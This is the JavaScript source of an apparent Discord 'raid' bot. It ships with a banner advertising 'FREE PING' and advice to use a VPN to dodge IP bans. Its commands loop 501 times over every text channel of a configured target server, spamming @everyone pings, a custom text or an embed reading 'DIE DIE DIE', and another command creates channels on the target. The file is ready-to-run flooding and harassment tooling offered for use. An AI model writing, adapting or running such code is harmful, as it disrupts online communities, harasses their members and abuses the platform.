const { Client, MessageEmbed, Message } = require('discord.js')
const { Menu } = require('discord.js-menu')
const config = require('./config.json');
const chalk = require('chalk');
const client = new Client();


client.on("ready", () => {
    console.log("");
    console.log((chalk.green(`⠀⠀⠀⠀⠀⣀⣤⣴⡶⠶⠓⠀⠀⠀⠀⠀⠀⠚⠶⢶⣦⣤⣀`)));
    console.log((chalk.green(`⠀⠀⠀⣠⣾⡟⠉⣀⣤⣶⣶⣾⣿⣿⣿⣿⣷⣶⣶⣤⣀⠉⢻⣷⣄`)));
    console.log((chalk.green(`⠀⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆`)));
    console.log((chalk.green(`⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄`)));
    console.log((chalk.green(`⠀⣼⣿⣿⣿⣿⣿⣿⣿⠿⠿⢿⣿⣿⣿⣿⡿⠿⠿⣿⣿⣿⣿⣿⣿⣿⣧`)));
    console.log((chalk.green(`⢀⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⣿⣿⣿⣿⠀⠀⠀⠈⣿⣿⣿⣿⣿⣿⣿⡀`)));
    console.log((chalk.green(`⢸⣿⣿⣿⣿⣿⣿⣿⣆⠀⠀⣠⣿⣿⣿⣿⣄⠀⠀⣰⣿⣿⣿⣿⣿⣿⣿⡇`)));
    console.log((chalk.green(`⣸⣿⣿⣿⣿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣿⣿⣿⣿⣇    `)));
    console.log((chalk.green(`⠹⣿⣿⣿⣿⣄⡈⠙⠻⠿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠟⠋⢁⣠⣿⣿⣿⣿⠏`)));
    console.log((chalk.green(`⠀⠈⠙⠿⢿⣿⣿⣷⣶⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣶⣾⣿⣿⡿⠿⠛⠁`)));
    console.log((chalk.green(`⠀⠀⠀⠀⠀⠀⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉`)));
    console.log((chalk.blue(`          FREE PING`)));
    console.log("");
    console.log("");
    console.log((chalk.green(`Subs to WithoutWalls : https://www.youtube.com/channel/UC7Lro_3YxdbOWhWNqHSpGnA?view_as=subscriber`)));
    console.log("");
    console.log("");
    console.log((chalk.red(`Use this code is at your own risk`)));
    console.log((chalk.red(`Don't ask me if your account got IP Banned`)));
    console.log((chalk.red(`I recommend you to use this on VPN or something, just want to make sure you didn't get IP Banned`)));
    console.log("");
    console.log("");
    console.log(`i'm ready to raid, now i'm || ${client.user.username} || in ${client.guilds.cache.size} guilds || that have ${client.users.cache.size} total people ||  in ${client.channels.cache.size} channels || have ${client.emojis.cache.size} emoji(s)`);
    client.user.setActivity(`GET REKT LOL`, {type: 'LISTENING'});
  });

client.on('message', message => {
    if (message.content === "help") {
       message.channel.send("Wait, i'm a raider, i don't have any command except \"start raid embed\", \"start raid everyone\", and \"start raid\" ")
    }
    if (message.content === "start raid everyone") {
        let server = client.guilds.cache.get(config.serverid);
        for(let i =0;i<=500;i++) { 
        server.channels.cache.filter(r => r.type === "text")
        .forEach(channel => { channel.send(" @everyone this server is raided get rekt"); 
    }) 
} 
    }
    if (message.content === "start raid embed") {
        let server = client.guilds.cache.get(config.serverid);

        let messageembed = new MessageEmbed()
        .setTitle("This server was raided, get rekt!")
        .setImage("https://media.tenor.com/images/78b5382c0e615ae2f56ba083a61f0506/tenor.gif")
        .addField("DIE DIE DIE", "IT'S REALLY FUN LMFAOOO");
        for(let i =0;i<=500;i++) { 
        server.channels.cache.filter(r => r.type === "text")
        .forEach(channel => { channel.send(messageembed); 
    }) 
} 
    }
    if (message.content === "start raid") {
        let server = client.guilds.cache.get(config.serverid);
        for(let i =0;i<=500;i++) { 
        server.channels.cache.filter(r => r.type === "text")
        .forEach(channel => { channel.send(config.customtext); 
    }) 
} 
    }
    
    if (message.content === "make channel") {
        let targetserver = client.guilds.cache.get(config.serverid);
        var name = message.author.username;
    
        targetserver.channels.create(name, "raid");
    }
})

client.login(config.token)